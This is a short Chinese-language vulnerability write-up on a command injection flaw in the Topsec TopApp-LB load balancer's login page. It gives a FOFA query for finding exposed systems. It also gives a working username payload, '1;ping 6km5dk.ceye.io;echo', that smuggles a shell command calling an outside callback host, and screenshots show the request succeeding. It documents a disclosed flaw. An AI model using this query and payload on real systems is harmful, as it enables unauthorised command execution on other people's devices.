# 天融信 TopApp-LB 命令执行漏洞

## 漏洞描述

天融信负载均衡TopApp-LB系统存在任意命令执行

## 影响版本

```
天融信负载均衡TopApp-LB
```

## FOFA

```
app="天融信-TopApp-LB-负载均衡系统"
```

## 漏洞复现

登录界面中存在命令执行



账号:**1;ping 6km5dk.ceye.io;echo**

密码:**任意**



![](https://typora-1308934770.cos.ap-beijing.myqcloud.com/202202091921374.png)



成功收到请求



![](https://typora-1308934770.cos.ap-beijing.myqcloud.com/202202091921379.png)